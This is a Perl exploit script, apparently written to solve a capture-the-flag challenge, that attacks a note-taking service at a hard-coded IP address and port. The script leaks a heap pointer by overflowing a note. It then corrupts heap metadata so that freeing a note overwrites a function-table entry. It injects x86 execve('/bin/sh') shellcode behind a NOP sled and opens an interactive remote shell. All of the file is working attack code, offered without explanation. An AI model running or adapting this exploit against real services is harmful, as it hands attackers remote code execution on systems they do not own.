#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;
use IO::Select;

my $shellcode = "\x31\xc0\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69" . 
    "\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";


my $data = 0x0804a048;
my $heap;

my $sock = IO::Socket::INET->new(
#    PeerAddr => '127.0.0.1',
    PeerAddr => '54.81.149.239',
 				 PeerPort => 9174,
 				 Proto => 'tcp');

$| = 1;

# add note
print $sock "1\n10\n";

# add note
print $sock "1\n10\n";


# change note
print $sock "3\n0\n16\n"; 
sleep 2; 
print $sock "A"x16; 

print $sock "4\n0\n";

sleep 2;
while(<$sock>) {
    if(m/A{16}(....)/) {
	$heap = unpack('L', $1);
	printf "Heap: 0x%08x\n", $heap;
	last;
    }
}

# change note
print $sock "3\n1\n10\n"; 
sleep 2; 
print $sock "B"x10; 

# change note
print $sock "3\n0\n550\n";
sleep 2;
my $s = "A"x16 . pack('L', $heap+200) . pack('L', 0x804a010-4) . "\x90"x(526-length($shellcode)) . $shellcode;

print $sock $s;

# remove note
print $sock "2\n1\n";


# exit
print $sock "-1\n";

sleep 2;

shell();

# interactive shell
sub shell {    
    my $s = IO::Select->new();
    my @ready;
    my $buf;

    $s->add(\*STDIN);
    $s->add($sock);

    while(1) {
	@ready = $s->can_read(0.10);
	foreach(@ready) {
	    if($sock == $_) {
		$sock->recv($buf, 1024);
		print $buf;
	    } elsif(\*STDIN == $_) {
		$buf = <STDIN>;
		print $sock $buf;
	    }
	}
    }
}
